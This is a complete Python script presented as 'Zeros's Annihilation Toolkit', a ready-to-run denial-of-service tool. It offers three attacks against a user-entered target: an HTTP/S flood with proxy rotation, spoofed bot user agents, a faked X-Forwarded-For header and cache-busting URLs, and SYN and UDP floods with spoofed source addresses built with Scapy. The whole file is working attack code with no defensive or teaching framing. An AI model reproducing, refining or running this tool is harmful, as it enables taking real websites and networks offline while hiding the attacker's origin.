# filename: zeros_ddos_toolkit.py

import requests
import threading
import random
import time
import sys
import os
import socket
from urllib.parse import urlparse
from collections import deque

# --- SCAPY IMPORT (Requires root/admin privileges for raw sockets) ---
try:
    from scapy.all import IP, TCP, UDP, send, RandShort, Raw
    SCAPY_AVAILABLE = True
except ImportError:
    print("[!] Warning: Scapy not found. Layer 4 (SYN/UDP) attacks will be disabled.")
    SCAPY_AVAILABLE = False
except Exception as e:
    print(f"[!] Warning: Scapy import failed: {e}. Layer 4 (SYN/UDP) attacks will be disabled.")
    SCAPY_AVAILABLE = False

# --- Configuration & Global State ---
DEFAULT_THREADS = 250
DEFAULT_REQUESTS_PER_THREAD = 1000 # For HTTP/S Flood
DEFAULT_PACKETS_PER_THREAD = 5000 # For SYN/UDP Flood
TIMEOUT = 5  # seconds for HTTP/S request timeout
PROXY_FILE = "proxies.txt" # List of proxies (e.g., http://ip:port or user:pass@ip:port)

# --- User Agents for Rotation (Expanded & Updated) ---
USER_AGENTS = [
    # Desktop Browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/110.0.1587.49",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 OPR/96.0.0.0",
    # Mobile Browsers
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:110.0) Gecko/110.0 Firefox/110.0",
    # Bots/Crawlers (for misdirection)
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "YandexBot/3.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot)",
]

# --- Global Counters and Locks ---
successful_requests = 0
failed_requests = 0
total_attempts = 0
attack_active = True
lock = threading.Lock()
proxies_queue = deque() # For proxy rotation

# --- Utility Functions ---
def load_proxies(filename):
    if not os.path.exists(filename):
        print(f"[!] Proxy file '{filename}' not found. Continuing without proxies.")
        return []
    with open(filename, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(proxies)} proxies from '{filename}'.")
    return proxies

def get_random_string(length=10):
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for _ in range(length))

def resolve_target(target_url):
    try:
        parsed_url = urlparse(target_url)
        hostname = parsed_url.hostname
        if not hostname:
            raise ValueError("Invalid URL format: no hostname.")
        
        ip_address = socket.gethostbyname(hostname)
        port = parsed_url.port
        if not port:
            port = 80 if parsed_url.scheme == 'http' else (443 if parsed_url.scheme == 'https' else 80)
        
        return ip_address, port, parsed_url.scheme
    except socket.gaierror:
        print(f"[!] Could not resolve hostname for '{target_url}'. Check URL or network connection.")
        sys.exit(1)
    except ValueError as e:
        print(f"[!] Invalid target URL: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An unexpected error occurred while resolving target: {e}")
        sys.exit(1)

# --- Attack Functions ---

# Layer 7: HTTP/S Flood
def http_flood(target_url, requests_to_send, thread_id):
    global successful_requests, failed_requests, total_attempts, attack_active

    session = requests.Session()
    
    for i in range(requests_to_send):
        if not attack_active:
            break

        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Referer': target_url + "/" + get_random_string(8), # Random referrer
            'X-Forwarded-For': f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}" # Fake IP
        }

        current_proxies = {}
        if proxies_queue:
            proxy_url = proxies_queue.popleft()
            proxies_queue.append(proxy_url) # Rotate proxy
            current_proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

        # Randomize URL path/query to bypass caching and simple rate limiting
        modified_url = f"{target_url}?{get_random_string(5)}={get_random_string(10)}"

        try:
            with lock:
                total_attempts += 1
            response = session.get(modified_url, headers=headers, proxies=current_proxies, timeout=TIMEOUT)
            with lock:
                if response.status_code < 400: # 2xx and 3xx are often "successful" in a flood context
                    successful_requests += 1
                else:
                    failed_requests += 1
            # print(f"[Thread-{thread_id}] HTTP GET {modified_url} - Status: {response.status_code} {'(via proxy)' if current_proxies else ''}")
        except requests.exceptions.Timeout:
            with lock:
                failed_requests += 1
            # print(f"[Thread-{thread_id}] HTTP GET {modified_url} - Timeout!", file=sys.stderr)
        except requests.exceptions.ConnectionError:
            with lock:
                failed_requests += 1
            # print(f"[Thread-{thread_id}] HTTP GET {modified_url} - Connection Error {'(proxy failed)' if current_proxies else ''}!", file=sys.stderr)
        except Exception as e:
            with lock:
                failed_requests += 1
            # print(f"[Thread-{thread_id}] HTTP GET {modified_url} - Unexpected Error: {e}", file=sys.stderr)

# Layer 4: SYN Flood
def syn_flood(target_ip, target_port, packets_to_send, thread_id):
    global successful_requests, failed_requests, total_attempts, attack_active
    if not SCAPY_AVAILABLE:
        return

    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    for i in range(packets_to_send):
        if not attack_active:
            break

        try:
            with lock:
                total_attempts += 1
            
            # Craft SYN packet with random source port and sequence number
            packet = IP(src=src_ip, dst=target_ip)/TCP(sport=RandShort(), dport=target_port, flags="S", seq=RandShort())
            send(packet, verbose=0) # verbose=0 suppresses Scapy's default output
            with lock:
                successful_requests += 1 # Counting sent packets as successful attempts
            # print(f"[Thread-{thread_id}] SYN Packet sent to {target_ip}:{target_port} from {src_ip}")
        except Exception as e:
            with lock:
                failed_requests += 1
            # print(f"[Thread-{thread_id}] SYN Flood Error: {e}", file=sys.stderr)
        time.sleep(0.001) # Small delay to prevent overwhelming local network stack

# Layer 4: UDP Flood
def udp_flood(target_ip, target_port, packets_to_send, thread_id):
    global successful_requests, failed_requests, total_attempts, attack_active
    if not SCAPY_AVAILABLE:
        return

    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    
    for i in range(packets_to_send):
        if not attack_active:
            break

        try:
            with lock:
                total_attempts += 1
            
            # Craft UDP packet with random source port and random payload
            payload = Raw(load=get_random_string(random.randint(50, 500)).encode('utf-8')) # Random payload size
            packet = IP(src=src_ip, dst=target_ip)/UDP(sport=RandShort(), dport=target_port)/payload
            send(packet, verbose=0)
            with lock:
                successful_requests += 1
            # print(f"[Thread-{thread_id}] UDP Packet sent to {target_ip}:{target_port} from {src_ip}")
        except Exception as e:
            with lock:
                failed_requests += 1
            # print(f"[Thread-{thread_id}] UDP Flood Error: {e}", file=sys.stderr)
        time.sleep(0.001) # Small delay

# --- GUI-like Display and Main Logic ---
def main():
    global attack_active, proxies_queue

    # --- Banner ---
    print(r"""
  ███████╗██████╗  ██████╗  ██████╗ ███████╗
  ██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝
  ███████╗██████╔╝██║   ██║██║   ██║█████╗  
  ╚════██║██╔══██╗██║   ██║██║   ██║██╔══╝  
  ███████║██║  ██║╚██████╔╝╚██████╔╝███████╗
  ╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
                                          
    """)
    print("        [+] ZEROS'S ANNIHILATION TOOLKIT [+]\n")
    print("--------------------------------------------------")

    # --- User Input ---
    target_input = input("  [>] Enter target URL or IP:PORT (e.g., http://example.com or 192.168.1.1:80): ")
    if not target_input.strip():
        print("  [!] Target cannot be empty. Exiting.")
        return

    # Determine if it's a URL or IP:PORT
    is_url = False
    if "://" in target_input or "." in target_input and "/" in target_input:
        is_url = True
    elif ":" in target_input and target_input.count(':') == 1 and all(part.isdigit() for part in target_input.split(':')[1:]):
        # Likely IP:PORT
        pass
    elif target_input.replace('.', '').isdigit(): # Simple IP check
        pass
    else: # Assume URL if it contains dots but no scheme
        target_input = "http://" + target_input
        is_url = True

    target_ip, target_port, target_scheme = None, None, None
    if is_url:
        target_ip, target_port, target_scheme = resolve_target(target_input)
    else:
        try:
            parts = target_input.split(':')
            if len(parts) != 2 or not parts[1].isdigit():
                raise ValueError("Invalid IP:PORT format.")
            target_ip = parts[0]
            target_port = int(parts[1])
            target_scheme = "raw" # Indicate raw socket attack
        except ValueError as e:
            print(f"[!] Invalid IP:PORT format: {e}. Exiting.")
            return

    print(f"  [i] Target Resolved: IP={target_ip}, Port={target_port}, Scheme={target_scheme}")

    # --- Attack Type Selection ---
    print("\n  [+] Select Attack Mode:")
    print("      1. HTTP/S Flood (Layer 7 - Web Application)")
    if SCAPY_AVAILABLE:
        print("      2. SYN Flood (Layer 4 - TCP Handshake Exhaustion)")
        print("      3. UDP Flood (Layer 4 - Bandwidth/Resource Exhaustion)")
    
    attack_mode = input("  [>] Enter choice (1, 2, or 3): ").strip()

    if attack_mode == '1':
        if not is_url:
            print("[!] HTTP/S Flood requires a URL target. Exiting.")
            return
        attack_func = http_flood
        print("  [+] HTTP/S Flood selected.")
        proxies = load_proxies(PROXY_FILE)
        if proxies:
            proxies_queue.extend(proxies)
            print(f"  [+] Proxies loaded and will be rotated ({len(proxies)} available).")
        else:
            print("  [!] No proxies loaded. Attack will originate directly.")
    elif attack_mode == '2' and SCAPY_AVAILABLE:
        attack_func = syn_flood
        print("  [+] SYN Flood selected.")
        if os.geteuid() != 0:
            print("[!] SYN Flood requires root/administrator privileges. Exiting.")
            return
    elif attack_mode == '3' and SCAPY_AVAILABLE:
        attack_func = udp_flood
        print("  [+] UDP Flood selected.")
        if os.geteuid() != 0:
            print("[!] UDP Flood requires root/administrator privileges. Exiting.")
            return
    else:
        print("  [!] Invalid or unavailable attack mode. Exiting.")
        return

    try:
        num_threads = int(input(f"  [>] Enter number of threads (default: {DEFAULT_THREADS}): ") or DEFAULT_THREADS)
        if num_threads <= 0:
            raise ValueError
    except ValueError:
        print("  [!] Invalid number of threads. Using default.")
        num_threads = DEFAULT_THREADS

    if attack_mode == '1': # HTTP/S Flood
        try:
            requests_or_packets_per_thread = int(input(f"  [>] Enter requests per thread (default: {DEFAULT_REQUESTS_PER_THREAD}): ") or DEFAULT_REQUESTS_PER_THREAD)
            if requests_or_packets_per_thread <= 0:
                raise ValueError
        except ValueError:
            print("  [!] Invalid requests per thread. Using default.")
            requests_or_packets_per_thread = DEFAULT_REQUESTS_PER_THREAD
    elif attack_mode in ['2', '3'] and SCAPY_AVAILABLE: # SYN/UDP Flood
        try:
            requests_or_packets_per_thread = int(input(f"  [>] Enter packets per thread (default: {DEFAULT_PACKETS_PER_THREAD}): ") or DEFAULT_PACKETS_PER_THREAD)
            if requests_or_packets_per_thread <= 0:
                raise ValueError
        except ValueError:
            print("  [!] Invalid packets per thread. Using default.")
            requests_or_packets_per_thread = DEFAULT_PACKETS_PER_THREAD

    print("\n--------------------------------------------------")
    print(f"  [+] Target: {target_input} (Resolved to {target_ip}:{target_port})")
    print(f"  [+] Attack Type: {'HTTP/S Flood' if attack_mode == '1' else ('SYN Flood' if attack_mode == '2' else 'UDP Flood')}")
    print(f"  [+] Threads: {num_threads}")
    print(f"  [+] {'Requests' if attack_mode == '1' else 'Packets'} per thread: {requests_or_packets_per_thread}")
    print("--------------------------------------------------\n")

    confirm = input("  [?] Press 'Y' to INITIATE ANNIHILATION, or any other key to abort: ").strip().lower()
    if confirm != 'y':
        print("  [!] Annihilation cancelled. Exiting.")
        return

    print("\n  [+] Unleashing the storm...\n")
    
    threads = []
    for i in range(num_threads):
        if attack_mode == '1':
            thread = threading.Thread(target=attack_func, args=(target_input, requests_or_packets_per_thread, i + 1))
        elif attack_mode in ['2', '3'] and SCAPY_AVAILABLE:
            thread = threading.Thread(target=attack_func, args=(target_ip, target_port, requests_or_packets_per_thread, i + 1))
        else:
            print(f"[!] Critical error: Could not assign attack function for thread {i+1}. Exiting.")
            attack_active = False
            return
            
        threads.append(thread)
        thread.daemon = True # Allows main program to exit even if threads are still running
        thread.start()

    # --- Attack Monitoring ---
    start_time = time.time()
    try:
        while attack_active and threading.active_count() > 1: # Wait for all attack threads to finish or interruption
            elapsed_time = time.time() - start_time
            with lock:
                sys.stdout.write(f"\r  [>>] Attack Status: ACTIVE | Sent: {total_attempts} | Success: {successful_requests} | Failed: {failed_requests} | Time: {elapsed_time:.2f}s")
                sys.stdout.flush()
            time.sleep(1) # Update every second
        
        # Final update after all threads complete or attack stopped
        elapsed_time = time.time() - start_time
        sys.stdout.write(f"\r  [>>] Attack Status: {'COMPLETE' if attack_active else 'INTERRUPTED'} | Sent: {total_attempts} | Success: {successful_requests} | Failed: {failed_requests} | Time: {elapsed_time:.2f}s\n")
        sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n  [!] Annihilation interrupted by operator. Ceasing fire...")
        attack_active = False # Signal threads to stop
        # Give a moment for threads to acknowledge the stop signal
        time.sleep(2) 
        print("  [!] Exiting.")

    print("\n\n--------------------------------------------------")
    print("  [+] Annihilation Report:")
    print(f"  Total Attempts:      {total_attempts}")
    print(f"  Successful Deliveries: {successful_requests}")
    print(f"  Failed Deliveries:   {failed_requests}")
    print(f"  Total Duration:    {time.time() - start_time:.2f} seconds")
    print("--------------------------------------------------")
    print("  [+] ZEROS'S ANNIHILATION TOOLKIT - Made By Zeros [+]")
    print("--------------------------------------------------")

if __name__ == "__main__":
    main()